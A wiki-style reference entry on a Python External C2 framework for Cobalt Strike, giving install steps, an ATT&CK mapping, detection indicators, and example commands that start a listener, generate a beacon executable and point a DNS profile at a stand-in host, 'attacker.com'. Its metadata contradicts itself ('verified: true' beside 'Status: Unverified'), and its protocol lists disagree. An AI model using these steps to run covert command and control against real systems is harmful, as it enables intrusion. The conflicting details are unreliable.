---
id: fa7a94e2-52c0-4ad3-874f-b4f4852480ad
type: tool
description: >-
  A Python-based framework for implementing custom External C2 listeners and
  profiles in Cobalt Strike, enabling advanced command and control over
  non-standard protocols.
verified: true
url: 'https://github.com/ly4k/ExternalC2'
created_at: '2019-08-28T21:17:23.905064+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - c2
  - cobalt-strike
  - external-c2
  - red-team
validated: true
---

# External C2 Framework

**Status**: Unverified

## Overview

The External C2 Framework is a Python library and toolset designed to extend Cobalt Strike's External C2 capabilities. It allows red teams to create custom listeners, generate beacons, and configure Malleable C2 profiles for evading detection through protocol tunneling and custom communication channels. Commonly used in advanced persistent threat simulations and red team engagements requiring flexible C2 infrastructure.

## Description

This framework integrates directly with Cobalt Strike's External C2 feature, which enables the use of external tools for handling beacon traffic. It supports protocols like HTTP/HTTPS, DNS, and TCP, with built-in support for obfuscation and jitter to mimic legitimate traffic. The tool is particularly useful for operations where standard Cobalt Strike listeners are insufficient, such as in highly monitored environments or when integrating with custom implants.

## Features

- Custom listener implementation for External C2 in Python
- Beacon payload generation with profile integration
- Profile configuration and validation tools
- Support for multiple protocols (HTTP, DNS, SMB)
- Jitter and sleep mask configuration for evasion
- Logging and debugging modes for operational troubleshooting

## Installation

### Requirements

- Python 3.6+
- Cobalt Strike 4.0+ with External C2 enabled
- Git for cloning the repository
- pip for dependency installation

### Install Commands

```bash
# Clone the repository
git clone https://github.com/ly4k/ExternalC2.git
cd ExternalC2

# Install dependencies
pip install -r requirements.txt

# For development setup
pip install -e .
```

On Windows, ensure Python is in PATH and use `pip` accordingly. For Kali Linux, it's compatible out-of-the-box.

## Basic Usage

```bash
python external_c2.py --help
```

This displays all available subcommands: server, generate-beacon, configure-profile, etc.

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and exit |
| -v, --verbose | Enable verbose logging |
| --profile | Specify a Malleable C2 profile path |
| --debug | Run in debug mode for troubleshooting |

## Examples

### Example 1: Basic Usage

Start a simple HTTP listener:

```bash
python external_c2.py --server --host 0.0.0.0 --port 80 --profile http.profile
```

### Example 2: Advanced Usage

Generate a beacon and configure a DNS profile:

```bash
python external_c2.py --generate-beacon --output beacon.exe --c2-server dns.example.com:53 --profile dns.profile
python external_c2.py --configure-profile --input base.profile --output custom-dns.profile --dns-host attacker.com
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Standard Application Layer Protocol]] Application Layer Protocol
- [[Non-Standard Port]] Non-Standard Port
- [[Standard Non-Application Layer Protocol]] Non-Application Layer Protocol

### Tactics

- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual Python processes binding to non-standard ports
- Network traffic patterns matching Malleable C2 profiles (e.g., jittered HTTP requests)
- Cobalt Strike beacon artifacts in memory or filesystem
- External C2 listener logs on compromised hosts
- Anomalous DNS queries or SMB traffic from implants

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/cobalt-strike]]
- [[tools/Impacket]]

## References

- Official GitHub Repository: https://github.com/ly4k/ExternalC2
- Cobalt Strike External C2 Documentation: https://www.cobaltstrike.com/help-malleable-c2
- Related resources: Black Hills Information Security blogs on External C2
